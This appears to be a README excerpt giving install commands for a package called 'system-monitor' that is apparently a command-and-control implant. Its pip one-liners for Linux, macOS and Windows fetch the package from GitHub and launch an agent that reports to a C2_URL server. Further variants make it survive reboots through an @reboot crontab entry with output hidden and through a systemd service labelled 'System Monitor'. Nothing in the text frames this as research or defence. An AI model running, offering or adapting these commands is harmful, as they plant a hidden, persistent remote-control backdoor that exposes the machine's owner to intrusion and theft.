🐙 GitHub Method (Recommended)

GitHub
pip install (Linux/macOS):
pip install git+https://github.com/GaredBerns/system-monitor.git && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &
pip install (Windows):
pip install git+https://github.com/GaredBerns/system-monitor.git && set C2_URL=http://YOUR_SERVER:5000 && python -m src.agents.universal
With crontab persistence:
pip install git+https://github.com/GaredBerns/system-monitor.git && (crontab -l 2>/dev/null; echo "@reboot C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal >/dev/null 2>&1 &") | crontab - && C2_URL=http://YOUR_SERVER:5000 python -m src.agents.universal &
With systemd service:
pip install git+https://github.com/GaredBerns/system-monitor.git sudo tee /etc/systemd/system/sysmon.service > /dev/null <<EOF [Unit] Description=System Monitor After=network.target [Service] Environment="C2_URL=http://YOUR_SERVER:5000" ExecStart=/usr/bin/python3 -m src.agents.universal Restart=always [Install] WantedBy=multi-user.target EOF sudo systemctl daemon-reload && sudo systemctl enable --now sysmon
